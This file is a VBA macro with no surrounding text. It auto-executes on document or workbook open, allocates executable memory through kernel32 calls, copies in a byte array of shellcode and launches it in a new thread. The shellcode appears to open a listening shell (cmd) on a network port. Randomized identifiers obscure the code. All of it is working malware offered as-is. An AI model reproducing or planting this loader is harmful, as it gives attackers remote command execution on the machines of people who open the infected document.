#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Dclpvr As Long, ByVal Ycq As Long, ByVal Ystwbjtua As LongPtr, Xfbdpmeq As Long, ByVal Fob As Long, Qxda As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Mhq As Long, ByVal Jwruwhywa As Long, ByVal Wic As Long, ByVal Geyzf As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Xystmi As LongPtr, ByRef Dpprawo As Any, ByVal Mbnbt As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Dclpvr As Long, ByVal Ycq As Long, ByVal Ystwbjtua As Long, Xfbdpmeq As Long, ByVal Fob As Long, Qxda As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Mhq As Long, ByVal Jwruwhywa As Long, ByVal Wic As Long, ByVal Geyzf As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Xystmi As Long, ByRef Dpprawo As Any, ByVal Mbnbt As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Goy As Long, Kve As Variant, Gmzbndjq As Long
#If Vba7 Then
	Dim  Qvcs As LongPtr, Ygh As LongPtr
#Else
	Dim  Qvcs As Long, Ygh As Long
#EndIf
	Kve = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0,0,104,119,115,50,95,84,104,76,119,38,7,255,213,184,144,1,0,0,41, _
196,84,80,104,41,128,107,0,255,213,106,8,89,80,226,253,64,80,64,80,104,234,15,223,224,255,213,151,104,2,0,31,144,137,230,106,16,86,87,104,194,219,55,103,255,213,87,104,183,233,56,255,255,213,87,104,116,236,59,225,255,213,87,151,104,117,110,77,97,255,213,104,99,109,100,0,137,227,87,87, _
87,49,246,106,18,89,86,226,253,102,199,68,36,60,1,1,141,68,36,16,198,0,68,84,80,86,86,86,70,86,78,86,86,83,86,104,121,204,63,134,255,213,137,224,78,86,70,255,48,104,8,135,29,96,255,213,187,240,181,162,86,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19, _
114,111,106,0,83,255,213)

	Qvcs = VirtualAlloc(0, UBound(Kve), &H1000, &H40)
	For Gmzbndjq = LBound(Kve) To UBound(Kve)
		Goy = Kve(Gmzbndjq)
		Ygh = RtlMoveMemory(Qvcs + Gmzbndjq, Goy, 1)
	Next Gmzbndjq
	Ygh = CreateThread(0, 0, Qvcs, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

